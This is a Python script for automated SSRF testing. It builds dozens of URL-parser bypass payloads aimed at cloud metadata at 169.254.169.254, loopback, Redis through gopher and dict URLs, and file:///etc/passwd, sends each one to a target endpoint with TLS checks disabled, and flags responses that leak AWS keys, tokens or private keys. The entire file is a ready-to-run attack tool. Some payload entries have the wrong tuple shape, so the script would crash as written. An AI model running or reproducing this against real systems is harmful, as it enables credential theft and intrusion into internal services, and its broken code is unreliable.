#!/usr/bin/env python3
"""URL Parser Differential — generates and tests all URL parser bypass variants against a target SSRF endpoint.

Usage:
    python3 url_parser_differential.py --target-url "https://target.com/api?url=TARGET" --bypass-host 127.0.0.1
    python3 url_parser_differential.py --target-url "https://target.com/api?url=TARGET" --bypass-host metadata --context .bb/context.json
"""
import argparse
import base64
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone


def load_context(ctx_path):
    if not ctx_path or not os.path.exists(ctx_path):
        return {}
    try:
        with open(ctx_path) as f:
            return json.load(f)
    except Exception:
        return {}


def generate_ip_obfuscations(ip_str):
    results = []
    parts = ip_str.split(".")
    if len(parts) != 4:
        return results
    try:
        nums = [int(p) for p in parts]
        dword = (nums[0] << 24) | (nums[1] << 16) | (nums[2] << 8) | nums[3]
        results.extend([
            ("decimal_ip", f"http://{dword}/"),
            ("decimal_ip_port80", f"http://{dword}:80/"),
            ("hex_dword", f"http://0x{dword:08x}/"),
            ("octal_dword", f"http://0{dword:011o}/"),
            ("hex_dotted", f"http://0x{nums[0]:x}.0x{nums[1]:x}.0x{nums[2]:x}.0x{nums[3]:x}/"),
            ("octal_dotted", f"http://0{nums[0]:o}.0{nums[1]:o}.0{nums[2]:o}.0{nums[3]:o}/"),
            ("mixed_hex_oct", f"http://0x{nums[0]:x}.0{nums[1]:o}.{nums[2]}.{nums[3]}/"),
        ])
        results.append(("urlencoded_ip", f"http://{'%2E'.join(parts)}/"))
        ipv6_mapped = "::ffff:" + ".".join(str(n) for n in nums)
        results.append(("ipv6_mapped", f"http://[{ipv6_mapped}]/"))
    except Exception:
        pass
    return results


def generate_all_bypasses(target_placeholder, bypass_host):
    if bypass_host in ("metadata", "169.254.169.254", "aws"):
        host = "169.254.169.254"
    elif bypass_host in ("localhost", "127.0.0.1", "loopback"):
        host = "127.0.0.1"
    else:
        host = bypass_host

    all_bypasses = []

    # ===== Category: Credential / @ parsing confusion =====
    all_bypasses.extend([
        ("cred_at_sign", f"http://target@{host}/", "URL parser may interpret 'target' as username and connect to host"),
        ("cred_at_sign_encoded", f"http://target%40{host}/", "URL-encoded @ sign may bypass filters targeting literal @"),
        ("cred_with_pass", f"http://target:password@{host}/", "Username:password@host format"),
        ("cred_with_pass_encoded", f"http://target:password%40{host}/", "URL-encoded @ in password field"),
        ("double_cred", f"http://fakesvc@{host}/", "Credential on single parse"),
        ("triple_cred", f"http://fake1@fake2@{host}/", "Multiple @ signs - parsers disagree on host"),
    ])

    # ===== Category: Fragment / # confusion =====
    all_bypasses.extend([
        ("hash_fragment", f"http://{host}#@trusted.com/", "Fragment suffix may be ignored"),
        ("hash_fragment_path", f"http://{host}%23@trusted.com/", "URL-encoded #"),
        ("hash_before_host", f"http://trusted.com/#@{host}/", "Fragment in URL path"),
    ])

    # ===== Category: DNS confusion (subdomain / lookup tricks) =====
    all_bypasses.extend([
        ("localhost_subdomain", f"http://localhost.trusted.com/", "localhost as subdomain prefix"),
        ("ip_subdomain", f"http://{host}.trusted.com/", "IP as subdomain"),
        ("nip_io", f"http://{host}.nip.io/", "Magic DNS that resolves label to IP"),
        ("xip_io", f"http://{host}.xip.io/", "Another magic DNS service"),
        ("sslip_io", f"http://{host}.sslip.io/", "sslip.io magic DNS"),
        ("localtest_me", f"http://localtest.me/", "Resolves to 127.0.0.1"),
        ("lvh_me", f"http://lvh.me/", "Resolves to 127.0.0.1"),
        ("spoofed_dns", f"http://spoofed.{host}/", "DNS that resolves to internal"),
    ])

    # ===== Category: IP obfuscation =====
    ip_obfs = generate_ip_obfuscations(host)
    all_bypasses.extend(ip_obfs)

    # ===== Category: Encoding tricks =====
    all_bypasses.extend([
        ("url_encoded_scheme", f"http://{host}/"),
        ("url_encoded_host", f"http://127%2e0%2e0%2e1/"),
        ("double_urlencode", f"http://%313237%2e%30%2e%30%2e1/"),
        ("html_entity_encoded", None),  # skip
    ])

    # ===== Category: Path / query confusion =====
    all_bypasses.extend([
        ("path_traversal_to_host", f"http://trusted.com/../{host}/"),
        ("semicolon_path", f"http://trusted.com/;http://{host}/"),
        ("newline_injection", f"http://trusted.com\\r\\nHost: {host}"),  # not used for GET
    ])

    # ===== Category: Slash confusion =====
    all_bypasses.extend([
        ("backslash_uri", f"http://trusted.com\\\\@{host}/"),
        ("forward_slash_encoding", f"http://trusted.com%2F{host}/"),
        ("double_slash_bypass", f"http://trusted.com/http://{host}/"),
    ])

    # ===== Category: Unicode / IDN =====
    all_bypasses.extend([
        ("unicode_lookalike", f"http://127\u30020\u30020\u30021/"),
        ("unicode_dot_like", f"http://127\uFF0E0\uFF0E0\uFF0E1/"),
    ])

    # ===== Category: Protocol bypass =====
    all_bypasses.extend([
        ("redirect_first", f"http://trusted.com/redirect?url=http://{host}/"),
        ("protocol_relative", f"//{host}/"),
        ("protocol_relative_https", f"https://{host}/"),
        ("ftp_protocol", f"ftp://{host}/"),
        ("dict_protocol", f"dict://{host}:6379/"),
        ("gopher_protocol", f"gopher://{host}:6379/_INFO%0D%0A"),
        ("file_protocol", f"file:///etc/passwd"),
    ])

    # Replace TARGET placeholder in target_url with each bypass payload
    resolved = []
    for name, payload, description in all_bypasses:
        if payload is None:
            continue
        resolved.append({
            "name": name,
            "payload": payload,
            "description": description,
            "bypass_host": host,
        })

    return resolved


def test_bypass(bypass, target_url, placeholder="TARGET", timeout=15):
    payload = bypass["payload"]
    test_url = target_url.replace(placeholder, urllib.parse.quote(payload, safe=""))
    if placeholder not in target_url:
        test_url = target_url.replace("{TARGET}", urllib.parse.quote(payload, safe=""))

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; URLParserDiff/2.0)",
        "Accept": "*/*",
    }

    try:
        http_ctx = ssl.create_default_context()
        http_ctx.check_hostname = False
        http_ctx.verify_mode = ssl.CERT_NONE

        start = time.time()
        req = urllib.request.Request(test_url, headers=headers)
        resp = urllib.request.urlopen(req, timeout=timeout, context=http_ctx)
        elapsed = time.time() - start
        body = resp.read()

        return {
            "bypass_name": bypass["name"],
            "payload": payload,
            "test_url": test_url,
            "status": resp.status,
            "body": body.decode("utf-8", errors="replace"),
            "body_len": len(body),
            "elapsed": elapsed,
            "result": "success",
            "headers": dict(resp.headers),
        }
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return {
            "bypass_name": bypass["name"],
            "payload": payload,
            "test_url": test_url,
            "status": e.code,
            "body": body.decode("utf-8", errors="replace") if body else "",
            "body_len": len(body) if body else 0,
            "elapsed": elapsed,
            "result": "error_response",
            "headers": dict(e.headers) if hasattr(e, 'headers') else {},
        }
    except Exception as e:
        return {
            "bypass_name": bypass["name"],
            "payload": payload,
            "test_url": test_url,
            "status": 0,
            "body": "",
            "body_len": 0,
            "elapsed": 0,
            "result": "connection_failed",
            "error": str(e),
            "headers": {},
        }


def analyze_finding_result(result):
    body = result.get("body", "")
    body_len = result.get("body_len", 0)
    status = result.get("status", 0)

    indicators = {
        "metadata_detected": False,
        "internal_service": False,
        "redirect": False,
        "error_leak": False,
    }

    metadata_sigs = [
        r'"AccessKeyId"', r'"SecretAccessKey"', r'"access_token"',
        r'"expires_in"', r'\bazEnvironment\b', r'\bdroplet_id\b',
        r'\binstance-id\b', r'\bram/security-credentials\b',
        r'BEGIN RSA PRIVATE KEY', r'BEGIN OPENSSH PRIVATE KEY',
        r'root:x:0:0', r'redis_version', r'cluster_name',
    ]
    for sig in metadata_sigs:
        if re.search(sig, body):
            indicators["metadata_detected"] = True
            break

    if status in (301, 302, 307, 308):
        indicators["redirect"] = True

    if "Internal Server Error" in body or "Stack Trace" in body:
        indicators["error_leak"] = True

    if (status == 200 and body_len > 0 and not indicators["metadata_detected"]):
        indicators["internal_service"] = True

    return indicators


def main():
    ap = argparse.ArgumentParser(description="URL Parser Differential — generate and test URL parser bypass variants")
    ap.add_argument("--target-url", required=True, help="Target URL with 'TARGET' placeholder where bypass payload goes (e.g. 'https://site/api?url=TARGET')")
    ap.add_argument("--bypass-host", required=True, help="Host to bypass to: '127.0.0.1', '169.254.169.254', 'localhost', 'metadata'")
    ap.add_argument("--placeholder", default="TARGET", help="Placeholder string in target-url (default: TARGET)")
    ap.add_argument("--context", default=None, help="Path to .bb/context.json for session configuration")
    ap.add_argument("--output", default=None, help="Output JSON file (default: bypass_results.json)")
    ap.add_argument("--dry-run", action="store_true", help="Generate bypasses without testing")
    ap.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    ap.add_argument("--delay", type=float, default=0.15, help="Delay between requests in seconds (default: 0.15)")
    ap.add_argument("--skip-encoded", action="store_true", help="Skip encoded host tests (may cause formatting issues)")
    args = ap.parse_args()

    context = load_context(args.context)
    outdir = context.get("OUTDIR", os.getcwd())
    output_file = args.output or os.path.join(outdir, "bypass_results.json")

    sys.stderr.write(f"[*] Target URL: {args.target_url}\n")
    sys.stderr.write(f"[*] Bypass host: {args.bypass_host}\n")
    sys.stderr.write(f"[*] Generating bypass variants...\n")

    bypasses = generate_all_bypasses(args.placeholder, args.bypass_host)

    if args.skip_encoded:
        bypasses = [b for b in bypasses if "encoded" not in b["name"]]

    sys.stderr.write(f"[*] Generated {len(bypasses)} bypass variants\n")

    for cat in ["cred_", "hash_", "subdomain", "ip_", "nip", "xip", "path_tr", "slash", "protocol_"]:
        matches = [b for b in bypasses if b["name"].startswith(cat) or cat in b["name"]]
        if matches:
            sys.stderr.write(f"    {cat}: {len(matches)} variants\n")

    if args.dry_run:
        sys.stderr.write("\n[DRY RUN] Generated bypass payloads:\n")
        for b in bypasses[:30]:
            sys.stderr.write(f"  [{b['name']}] {b['payload']}\n")
            sys.stderr.write(f"       {b['description']}\n")
        if len(bypasses) > 30:
            sys.stderr.write(f"  ... and {len(bypasses) - 30} more\n")
        sys.stdout.write(json.dumps({
            "status": "dry_run",
            "total_bypasses": len(bypasses),
            "target_url": args.target_url,
            "bypass_host": args.bypass_host,
        }))
        return

    sys.stderr.write(f"\n[*] Testing {len(bypasses)} bypass variants against target...\n")
    sys.stderr.write(f"[*] Rate: {args.delay}s delay between requests\n\n")

    results = []
    worked = []
    partial = []
    failed = []

    # First make a baseline request
    sys.stderr.write("[*] Sending baseline request first...\n")
    baseline_url = args.target_url.replace(args.placeholder, "http://example.com/")
    try:
        http_ctx = ssl.create_default_context()
        http_ctx.check_hostname = False
        http_ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(baseline_url, headers={"User-Agent": "Mozilla/5.0 (compatible; URLParserDiff/2.0)"})
        resp = urllib.request.urlopen(req, timeout=args.timeout, context=http_ctx)
        body = resp.read()
        baseline = {"status": resp.status, "body_len": len(body), "body": body.decode("utf-8", errors="replace")[:500]}
        sys.stderr.write(f"[*] Baseline: status={baseline['status']}, body_len={baseline['body_len']}\n")
    except Exception as e:
        baseline = {"status": -1, "body_len": -1, "error": str(e)}
        sys.stderr.write(f"[!] Baseline request failed: {e}\n")

    for i, bypass in enumerate(bypasses):
        name = bypass["name"]
        payload = bypass["payload"]
        sys.stderr.write(f"  [{i+1}/{len(bypasses)}] {name}... ")
        sys.stderr.flush()

        result = test_bypass(bypass, args.target_url, args.placeholder, args.timeout)
        indicators = analyze_finding_result(result)
        result["indicators"] = indicators
        result["description"] = bypass["description"]
        result["tested_at"] = datetime.now(timezone.utc).isoformat()

        results.append(result)

        if indicators["metadata_detected"]:
            worked.append(result)
            sys.stderr.write(f"CRITICAL (metadata detected! body_len={result['body_len']})\n")
        elif indicators["internal_service"] and result["status"] == 200:
            worked.append(result)
            sys.stderr.write(f"BYPS-WORK (status={result['status']} body_len={result['body_len']})\n")
        elif result["status"] == 200:
            partial.append(result)
            sys.stderr.write(f"PARTIAL (status={result['status']} body_len={result['body_len']})\n")
        elif result.get("result") == "connection_failed":
            failed.append(result)
            sys.stderr.write(f"FAIL\n")
        else:
            failed.append(result)
            sys.stderr.write(f"BLOCKED (status={result['status']})\n")

        time.sleep(args.delay)

    # Organize output by category
    output = {
        "metadata": {
            "target_url": args.target_url,
            "bypass_host": args.bypass_host,
            "total_bypasses": len(bypasses),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "baseline": baseline,
        },
        "summary": {
            "total": len(results),
            "fully_worked": len(worked),
            "partial": len(partial),
            "failed_or_blocked": len(failed),
        },
        "fully_worked": worked,
        "partial_matches": partial,
        "failed": failed,
        "all_results": results,
    }

    os.makedirs(os.path.dirname(output_file) or ".", exist_ok=True)
    with open(output_file, "w") as f:
        json.dump(output, f, indent=2, default=str)

    sys.stderr.write(f"\n{'='*60}\n")
    sys.stderr.write(f"RESULTS: {len(worked)} bypasses worked ({len(results)} total)\n")
    sys.stderr.write(f"{'='*60}\n")

    for r in worked:
        sys.stderr.write(f"  [+] {r['bypass_name']}: status={r['status']} body_len={r['body_len']}\n")
        sys.stderr.write(f"      payload: {r['payload'][:100]}\n")

    sys.stderr.write(f"\n[OUTPUT] -> {output_file}\n")

    sys.stdout.write(json.dumps(output["summary"]) + "\n")


if __name__ == "__main__":
    main()